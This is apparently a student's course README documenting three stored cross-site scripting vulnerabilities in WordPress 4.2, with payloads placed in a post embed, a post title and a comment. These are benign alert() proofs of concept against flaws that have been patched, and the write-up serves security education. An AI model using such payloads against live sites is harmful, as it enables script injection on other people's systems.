# Project 7 - WordPress Pentesting

Time spent: **4** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. (Required) WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.13
  - [ ] GIF Walkthrough: ![](https://github.com/Azhao19/Cybersecurity2021/blob/wp_exploits/Vuln1notYT.gif)
  - [ ] Steps to recreate: In the content of a post, enter the following:
        ```
        $ [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(12312313)\x3e'][/embed]
        ```
        Then, go to the post. The XSS will appear.
  - [ ] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
### 2. (Required) WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: ![] (https://github.com/Azhao19/Cybersecurity2021/blob/wp_exploits/Vuln2YT.gif)
  - [ ] Steps to recreate: In the title of a post, enter the following:
        ```
        $ <a href="</a><a title=" onmouseover=alert('xss')  ">link</a>
        ```
  - [ ] Affected source code:
    - wp-includes/kses.php wp-includes/shortcodes.php
### 3. (Required) Stored Cross-Site Scripting
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: ![] (https://github.com/Azhao19/Cybersecurity2021/blob/wp_exploits/Vuln3BIG.gif)
  - [ ] Steps to recreate: Suppose LARGE represents a 64 KB block of text. Then enter this into a comment:
        ```
        $ <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px LARGE'></a>
        ```
        The XSS will then appear persistently.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/changeset/32299)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
